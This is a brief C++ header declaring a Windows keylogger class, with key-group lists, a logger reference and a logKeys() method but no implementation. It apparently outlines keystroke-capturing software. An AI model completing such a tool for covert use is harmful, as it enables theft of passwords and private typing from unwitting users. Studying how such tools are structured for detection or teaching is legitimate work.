#pragma once
#include <windows.h>
#include "Logger.h"
#include <string>
#include <vector>

class Keylogger {
private:
	static const std::vector<int> valueKeys;
	static const std::vector<int> specialKeys;
	static const std::vector<int> numpadKeys;
	static const std::vector<int> funcKeys;
	static const std::vector<std::vector<int>> trackedKeys;

	Logger* logger;

public:
	Keylogger(Logger* logger);
	~Keylogger();

	void logKeys();

};